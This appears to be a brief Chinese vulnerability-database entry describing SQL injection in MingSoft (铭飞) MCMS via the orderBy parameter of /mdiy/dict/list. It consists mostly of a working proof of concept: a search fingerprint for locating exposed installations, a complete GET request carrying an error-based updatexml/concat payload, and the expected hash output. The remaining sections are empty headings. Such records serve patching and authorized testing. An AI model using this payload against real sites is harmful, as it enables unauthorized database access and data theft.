# 铭飞CMSdict-list存在SQL注入漏洞

- **系统**：铭飞　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="铭飞MCMS"`
- **请求**：`GET /mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20md5(1)),0x7e),1) HTTP/1.1`

**请求体 / payload**
```

c4ca4238a0b923820dcc509a6f75849
```

**其他**
- 铭飞CMS dict-list存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 铭飞CMS dict-list存在SQL注入漏洞